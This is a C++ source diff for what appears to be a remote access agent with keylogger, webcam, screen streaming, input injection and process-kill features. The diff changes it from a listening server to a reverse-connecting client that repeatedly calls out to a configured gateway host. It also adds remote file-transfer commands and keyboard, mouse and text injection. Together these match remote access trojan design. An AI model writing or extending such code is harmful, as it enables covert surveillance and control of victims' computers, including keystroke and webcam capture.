@@ -7,6 +7,7 @@
 #include "interfaces/IInputInjector.hpp"
 #include "core/network/TcpSocket.hpp"
 #include "core/network/PacketDispatcher.hpp"
+#include "handlers/FileCommandHandler.hpp"
 #include <cstring>
 #include <iostream>
 #include <algorithm>
@@ -17,6 +18,7 @@
 namespace core {
 
     BackendServer::BackendServer(
+        std::string gateway_host,
         uint16_t port,
         std::shared_ptr<BroadcastBus> bus_monitor,
         std::shared_ptr<BroadcastBus> bus_webcam,
@@ -24,64 +26,73 @@ namespace core {
         std::shared_ptr<StreamSession> webcam_session,
         std::shared_ptr<interfaces::IKeylogger> keylogger,
         std::shared_ptr<interfaces::IAppManager> app_manager,
-        std::shared_ptr<interfaces::IInputInjector> input_injector
-    ) : port_(port), bus_monitor_(bus_monitor), bus_webcam_(bus_webcam), session_(session),
+        std::shared_ptr<interfaces::IInputInjector> input_injector,
+        std::shared_ptr<interfaces::IFileTransfer> file_transfer
+    ) : gateway_host_(gateway_host), gateway_port_(port), bus_monitor_(bus_monitor), bus_webcam_(bus_webcam), session_(session),
         webcam_session_(webcam_session), keylogger_(keylogger), app_manager_(app_manager),
-        input_injector_(input_injector) {}
+        input_injector_(input_injector), file_transfer_(file_transfer) {
+
+        // Initialize Command Dispatcher and Register Handlers
+        dispatcher_ = std::make_unique<command::CommandDispatcher>();
+
+        if (file_transfer_) {
+            dispatcher_->register_handler(std::make_shared<handlers::FileCommandHandler>(*file_transfer_));
+        }
+    }
 
     BackendServer::~BackendServer() {
         stop();
     }
 
     void BackendServer::run() {
-        listen_fd_ = socket(AF_INET, SOCK_STREAM, 0);
-        if (!IS_VALID_SOCKET(listen_fd_)) return;
+        running_ = true;
+        std::cout << "[BackendServer] Agent Starting (Reverse Connection Model)..." << std::endl;
 
-        int opt = 1;
-        setsockopt(listen_fd_, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt));
+        while (running_) {
+            std::cout << "[BackendServer] Connecting to Gateway at " << gateway_host_ << ":" << gateway_port_ << "..." << std::endl;
+            socket_t fd = connect_to_gateway();
+
+            if (IS_VALID_SOCKET(fd)) {
+                std::cout << "[BackendServer] Connected to Gateway!" << std::endl;
+                handle_connection(fd);
+                std::cout << "[BackendServer] Disconnected from Gateway. Retrying in 5s..." << std::endl;
+            } else {
+                std::cout << "[BackendServer] Connection failed. Retrying in 5s..." << std::endl;
+            }
+
+            if (running_) {
+                std::this_thread::sleep_for(std::chrono::seconds(5));
+            }
+        }
+    }
+
+    socket_t BackendServer::connect_to_gateway() {
+        socket_t fd = socket(AF_INET, SOCK_STREAM, 0);
+        if (!IS_VALID_SOCKET(fd)) return INVALID_SOCKET;
 
         struct sockaddr_in addr;
         memset(&addr, 0, sizeof(addr));
         addr.sin_family = AF_INET;
-        addr.sin_addr.s_addr = INADDR_ANY;
-        addr.sin_port = htons(port_);
 
-        if (bind(listen_fd_, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
-            CLOSE_SOCKET(listen_fd_);
-            return;
+        // Use configured Gateway Host
+        addr.sin_addr.s_addr = inet_addr(gateway_host_.c_str());
+        addr.sin_port = htons(gateway_port_);
+
+        if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+            CLOSE_SOCKET(fd);
+            return INVALID_SOCKET;
         }
 
-        listen(listen_fd_, 10);
-        running_ = true;
-        std::cout << "[BackendServer] Core Listening on " << port_ << std::endl;
-
-        accept_loop();
+        return fd;
     }
 
     void BackendServer::stop() {
-        if (running_) {
-            running_ = false;
-            #ifdef _WIN32
-            shutdown(listen_fd_, SD_BOTH);
-            #else
-            shutdown(listen_fd_, SHUT_RDWR);
-            #endif
-            CLOSE_SOCKET(listen_fd_);
-        }
+        running_ = false;
+        // Logic to break the connect/handle loop is handled by checking running_ flag
+        // Actual socket closure happens inside handle_connection when it errors out
     }
 
-    void BackendServer::accept_loop() {
-        while (running_) {
-            struct sockaddr_in peer;
-            socklen_t len = sizeof(peer);
-            socket_t fd = accept(listen_fd_, (struct sockaddr*)&peer, &len);
-            if (!IS_VALID_SOCKET(fd)) break;
-
-            std::thread(&BackendServer::handle_client, this, fd).detach();
-        }
-    }
-
-    void BackendServer::handle_client(socket_t fd) {
+    void BackendServer::handle_connection(socket_t fd) {
         auto socket = std::make_shared<network::TcpSocket>(fd);
         socket->set_non_blocking(true);
         socket->set_no_delay(true);
@@ -218,6 +229,22 @@ namespace core {
             std::stringstream ss(msg);
             std::string cmd; ss >> cmd;
 
+            // Dispatch File Commands through the CommandDispatcher
+            if (cmd.rfind("file_", 0) == 0) {
+                if (dispatcher_) {
+                    core::command::CommandContext ctx;
+                    ctx.client_id = cid;
+                    ctx.backend_id = my_backend_id;
+                    // Create a responder that wraps the local sender lambda
+                    ctx.respond = [sender, cid, my_backend_id](std::vector<uint8_t>&& d, bool c) {
+                        sender(d, 0, c, cid, my_backend_id);
+                    };
+
+                    dispatcher_->dispatch(msg, ctx);
+                }
+                continue; // Skip legacy handling
+            }
+
             if (cmd == "ping") {
                  send_text("INFO:NAME=CoreAgent", cid, my_backend_id);
             }
@@ -315,6 +342,24 @@ namespace core {
                      std::this_thread::sleep_for(std::chrono::milliseconds(20));
                      input_injector_->click_mouse((interfaces::MouseButton)btn, false);
                  }
+            }
+            else if (cmd == "mouse_scroll") {
+                int delta; ss >> delta;
+                if(input_injector_) input_injector_->scroll_mouse(delta);
+            }
+            else if (cmd == "key_down") {
+                int code; ss >> code;
+                if(input_injector_) input_injector_->press_key(static_cast<interfaces::KeyCode>(code), true);
+            }
+            else if (cmd == "key_up") {
+                int code; ss >> code;
+                if(input_injector_) input_injector_->press_key(static_cast<interfaces::KeyCode>(code), false);
+            }
+            else if (cmd == "text_input") {
+                std::string text;
+                if(ss.peek() == ' ') ss.ignore();
+                std::getline(ss, text);
+                if(input_injector_) input_injector_->send_text(text);
             }
             else if (cmd == "kill_process") {
                  uint32_t pid; ss >> pid;
